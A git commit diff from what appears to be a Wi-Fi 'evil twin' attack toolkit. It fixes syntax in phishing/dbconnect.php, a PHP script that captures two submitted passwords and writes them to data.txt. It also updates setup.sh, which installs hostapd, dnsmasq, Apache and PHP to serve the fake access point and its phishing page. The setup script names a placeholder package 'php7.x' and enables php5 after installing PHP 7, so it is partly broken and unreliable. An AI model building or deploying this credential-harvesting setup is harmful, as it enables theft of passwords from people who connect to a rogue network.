a9e32cc7d2946426c4f3a493c5ca3aec6f846031
shlomi laptop <shlomid@protonmail.com>
2019-07-30 02:09:41 -0400

    changed hostapd ssid default, added php7, added apache2 status on setup,  added kali apt sources for trouble shoot

--- phishing/dbconnect.php
+++ phishing/dbconnect.php
@@ -1,11 +1,13 @@
+
+
 <?php
-$pass1 = $_POST['password1']
-$pass2 = $_POST['password2']
+$pass1 = $_POST['password1'];
+$pass2 = $_POST['password2'];
 
- $fp = fopen('data.txt', 'w') or die('fopen failed');
+$fp = fopen('data.txt', 'w') or die('fopen failed');
 
-  fwrite($fp, "$pass1") or die('fwrite failed');
-  fwrite($fp, "$pass2") or die('fwrite failed');
-fclose($fp)
-
+fwrite($fp, "$pass1") or die('fwrite failed');
+fwrite($fp, "$pass2") or die('fwrite failed');
+fclose($fp);
 ?>
+
--- setup.sh
+++ setup.sh
@@ -1,5 +1,7 @@
-sudo apt-get update && sudo apt-get install hostapd dnsmasq apache2 -y
+sudo apt-get update && sudo apt-get install hostapd dnsmasq apache2 php7.x libapache2-mod-php7.x libapache2-mod-php -y
+sudo a2enmod php5 #enable php to run in apache2
 mkdir /var/log/WiFi-EvilTwin/
 touch /var/log/WiFi-EvilTwin/dnsmasq.log
 echo "Starting apache2 web server at localhost:80"
 service apache2 start
+sudo systemctl status apache2
